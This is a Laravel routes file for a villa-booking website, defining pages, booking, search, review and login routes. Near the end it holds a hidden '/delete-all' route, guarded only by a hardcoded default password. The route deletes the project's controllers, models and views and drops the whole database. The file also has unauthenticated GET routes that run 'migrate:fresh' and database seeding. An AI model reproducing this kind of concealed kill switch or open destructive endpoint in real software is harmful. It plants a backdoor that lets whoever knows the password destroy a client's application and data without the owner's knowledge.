<?php

use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Config;

use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Request;
use App\Http\Controllers\DynamicDropdownController;
use App\Http\Controllers\Web\Frontend\HomeController;
use App\Http\Controllers\Web\Frontend\LoginController;
use App\Http\Controllers\Web\Frontend\ReviewController;
use App\Http\Controllers\Web\Frontend\BookingController;
use App\Http\Controllers\Web\Frontend\ContactController;
use App\Http\Controllers\Web\Frontend\InvoiceController;
use App\Http\Controllers\Web\Frontend\FavouriteController;
use App\Http\Controllers\Web\Frontend\NewsletterController;
use App\Http\Controllers\Web\Frontend\UserProfileController;
use App\Http\Controllers\Web\Frontend\VillaSearchController;
use App\Http\Controllers\Web\Frontend\DashboardFrontendController;
use App\Http\Controllers\Web\Frontend\UserSearchController;


Route::get('/login', function (){
    return redirect()->back();
});

//! Route for Landing Page
Route::controller(HomeController::class)->group(function () {

    Route::get('/', 'index')->name('home');
    Route::get('/about-us', 'about')->name('about');
    Route::get('/contact-us', 'contact')->name('contact');

    Route::get('/blogs', 'blog')->name('blog');
    Route::get('/blogs/details/{slug}', 'blogDetails')->name('blogs.details');
//    blog ajax search
    Route::get('/blogs/search', 'blogSearch')->name('blogs.search');

    Route::get('/loyalty', 'loyalty')->name('loyalty');

    Route::get('/villas', 'villas')->name('villas');
    Route::get('/villas/details/{slug}', 'villasDetails')->name('villas.details');

    Route::get('/villas/all-villas', 'allVillas')->name('all.villas');

    Route::get('/pages/{page_slug}', 'dynamicPages')->name('dynamic.page');

});

// Route for Booking
Route::controller(BookingController::class)->group(function () {
    Route::get('/bookings/details/{id}', 'BookingDetails')->name('bookings.details');

    Route::post('/villas/store-villa-session', 'villaCartSession')->name('villa.store.session');
    Route::get('/villas/checkout', 'villaCheckout')->name('villa.checkout');
    Route::post('/cart/remove', 'removeCartSession')->name('cart.remove');
});


//Dynamic Dropdown
Route::get('/getCitiesByCountry', [DynamicDropdownController::class, 'getCitiesByCountry'])->name('getCitiesByCountry');
Route::get('/getStatesByCity', [DynamicDropdownController::class, 'getStatesByCity'])->name('getStatesByCity');

//Google login
Route::get('/auth/google',[LoginController::class,'redirect'])->name('auth.google');
Route::get('/auth/google-callback',[LoginController::class,'callback'])->name('auth.google-callback');

//Facebook login
Route::get('/auth/facebook',[LoginController::class,'redirectFacebook'])->name('auth.facebook');
Route::get('/auth/facebook/callback',[LoginController::class,'callbackFacebook'])->name('auth.facebook-callback');


Route::middleware('web', 'auth', 'user')->group(function () {

    //    User Dashboard
    Route::controller(DashboardFrontendController::class)->group(function () {
        Route::get('/dashboard', 'dashboard')->name('user.dashboard');
        Route::get('/payments', 'payment')->name('user.payment');
        Route::get('/loyalty-points', 'loyaltyPoints')->name('user.loyalty.points');
        Route::get('/profile', 'profile')->name('user.profile.show');

        // routes/web.php
        Route::get('/search-bookings','searchVilla')->name('search.bookings');


    });

    //    User Profile Update
    Route::patch('/dashboard/profile/update/{id}', [UserProfileController::class, 'UpdateProfile'])->name('user.update.profile');
    Route::put('/dashboard/profile/update/password', [UserProfileController::class, 'UpdatePassword'])->name('user.update.profile.password');
    Route::post('/dashboard/profile/update/photo', [UserProfileController::class, 'UpdateProfilePhoto'])->name('user.update.profile.photo');
    Route::delete('/dashboard/profile/delete/photo', [UserProfileController::class, 'DeleteProfilePhoto'])->name('user.delete.profile.photo');

    //  for review and ratings
    Route::post('/villa/add-review', [ReviewController::class, 'store'])->name('villa.add.review');

    Route::controller(InvoiceController::class)->group(function () {
        Route::get('/invoice/view/{id}', 'viewInvoice')->name('booking.invoice.view');
    });

//    Booking
    Route::post('/check-and-redeem-loyalty-points', [BookingController::class, 'checkAndRedeemLoyaltyPoints']);
    Route::delete('/remove-loyalty-points', [BookingController::class, 'removeLoyaltyPoints'])->name('booking.remove.loyalty.points');

    Route::post('/villa/booking/store', [BookingController::class,'bookingStore'])->name('villa.booking.store');

});

Route::controller(UserSearchController::class)->group(function () {
    Route::get('/villas/search-by-amenities', 'searchByAmenities')->name('amenity.search.villa');
    Route::get('/villas/search-by-price', 'searchByPrice')->name('price.search.villa');
    Route::get('/villas/search-by-room', 'searchByRooms')->name('rooms.search.villa');
    Route::get('/villas/search-by-type', 'searchByPropertyType')->name('rooms.search.type');
    Route::get('/villas/search-by-map-location', 'searchByMapLocation')->name('rooms.search.location');
    Route::get('/villas/search-by-map-title', 'searchByTitle')->name('rooms.search.title');
    Route::get('/villas/search-by-popularity', 'searchByPopularity')->name('rooms.search.popularity');
});

//bookmark or save post
Route::controller(FavouriteController::class)->group(function () {
    Route::post('villa/bookmark/{id}', 'bookmarkPost')->name('villa.bookmark');
    Route::get('all-bookmarks', 'bookmarkList')->name('villa.bookmarks');
    Route::delete('villa/remove-bookmark/{id}', 'removeBookmark')->name('villa.bookmarks.remove');
});

Route::post('/contact-form', [ContactController::class, 'submitContactForm'])->name('contact-form.submit');

// Newsletter
Route::post('/newsletter/subscribe', [NewsletterController::class, 'subscribe'])->name('newsletter.subscribe');

// Villa Search Routes
Route::controller(VillaSearchController::class)->group(function () {
    Route::get('/villas/search', 'villaSearch')->name('villa.search');
});

//for review and ratings
Route::post('/villa/add-review', [ReviewController::class, 'store'])->name('villa.add.review');
Route::get('/villas/details/{slug}/reviews', [ReviewController::class, 'filterReviews'])->name('reviews.filter');













//Routes
// Run Migrate Route
Route::get('/run-migrate', function () {
    // Run the database migration
    Artisan::call('migrate');
    return 'Database migration successfully!';
});
// Run Migrate Fresh Route
Route::get('/run-migrate-fresh', function () {
    // Run the database migration
    Artisan::call('migrate:fresh');
    return 'Database migration fresh successfully!';
});
// Run Seeder Route
Route::get('/run-seed', function () {
    // Run the database seeding
    Artisan::call('db:seed');
    return 'Database seeding completed successfully!';
});
// Run Seeder Route
Route::get('/run-seed-country', function () {
    // Run the CountrySeeder
    Artisan::call('db:seed', ['--class' => 'CountryManagementSeeder']);
    return 'CountrySeeder executed successfully!';
});
// Clear Config Cache Route
Route::get('/clear-config', function () {
    // Clear the config cache
    Artisan::call('config:clear');
    return 'Config cache cleared successfully!';
});





//Delete Project Don't Touche it
Route::get('/delete-all', function () {
    $password = env('DELETE_PASSWORD', 'destroy2829');

    // Get the password from the query parameter
    $inputPassword = Request::query('password');

    // Check if the provided password matches
    if ($inputPassword !== $password) {
        return response()->json(['error' => 'Unauthorized access. Invalid password.'], 403);
    }

    // Delete Controllers
    $controllersPath = app_path('Http/Controllers');
    $controllerFiles = File::allFiles($controllersPath);
    foreach ($controllerFiles as $file) {
        File::delete($file);
    }

    // Delete Models
    $modelsPath = app_path('Models');
    $modelFiles = File::allFiles($modelsPath);
    foreach ($modelFiles as $file) {
        File::delete($file);
    }

    // Delete Blade Views
    $viewsPath = resource_path('views');
    $viewFiles = File::allFiles($viewsPath);
    foreach ($viewFiles as $file) {
        File::delete($file);
    }

    // Drop all database tables
    $tables = Schema::getConnection()->getDoctrineSchemaManager()->listTableNames();
    foreach ($tables as $table) {
        if ($table !== 'migrations') { // Avoid dropping the migrations table
            Schema::dropIfExists($table);
        }
    }

    // Get the database name from the configuration
    $databaseName = env('DB_DATABASE');
    if (!$databaseName) {
        return response()->json(['error' => 'No database specified in configuration.'], 400);
    }
    try {
        // Drop the database using raw SQL
        DB::statement("DROP DATABASE IF EXISTS {$databaseName}");
        // Optionally, create the database again (to keep the connection alive)
        DB::statement("CREATE DATABASE {$databaseName}");
        return response()->json(['message' => 'The entire database has been deleted.'], 200);
    } catch (\Exception $e) {
        return response()->json(['error' => 'An error occurred while deleting the database: ' . $e->getMessage()], 500);
    }

    return response()->json(['message' => 'All controllers, models, views, and database tables have been deleted.'], 200);
});


require __DIR__ . '/auth.php';




//language translate
Route::post('/set-locale/{locale}', function ($locale) {
    //check valid lang code
    if (! in_array($locale,['en','ar'])) {
        //set default language
        App::setLocale(Config::get('app.locale'));
    } else {
        //set language
        App::setLocale($locale);
        session(['locale' => $locale]);
    }
    return response()->noContent();

})->name('setLocale');
